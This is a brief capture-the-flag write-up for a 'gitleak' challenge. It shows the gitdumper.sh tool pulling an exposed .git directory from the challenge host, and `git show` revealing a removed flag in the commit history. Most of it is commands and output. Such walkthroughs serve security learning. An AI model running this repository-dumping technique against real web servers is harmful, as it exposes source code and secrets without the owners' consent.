# gitleak

Tag: `Information Leak`

[http://h4ck3r.quest:9000](http://h4ck3r.quest:9000)

## Writeup

[Script Kiddie](https://github.com/internetwache/GitTools)

```bash
$ ./gitdumper.sh http://h4ck3r.quest:9000/.git/ .
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/a0/228bd6ff968f3eca017125a5434b517ad2a83a
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/6c/fe38db75ec90126f53088ea87c286c83c1bfb3
[+] Downloaded: objects/12/24cacc70558caab321c9206b456293e4f57cf2
[+] Downloaded: objects/7a/6767749446508947d7f55bf4ccddf699d5c5a2
[+] Downloaded: objects/d1/f8785af1378ae3cc55bfe989658ed093be6551
[+] Downloaded: objects/e4/fae5bb06f2f65bb92af1d60d83290e65c9dab0
[+] Downloaded: objects/5b/6cf79253aa25ef5983baeb36e1e091d962baad
$ git show
commit a0228bd6ff968f3eca017125a5434b517ad2a83a (HEAD -> master)
Author: splitline <tbsthitw@gmail.com>
Date:   Wed Mar 9 16:23:46 2022 +0800

    Remove flag.

diff --git a/flag.php b/flag.php
index 5b6cf79..d1f8785 100644
--- a/flag.php
+++ b/flag.php
@@ -1,5 +1,5 @@
 <?php
-$FLAG = "FLAG{gitleak_is_fun}";
+// No flag for you!
 ?>

 Flag is in the source code.
\ No newline at end of file
```

## Flag

`FLAG{gitleak_is_fun}`
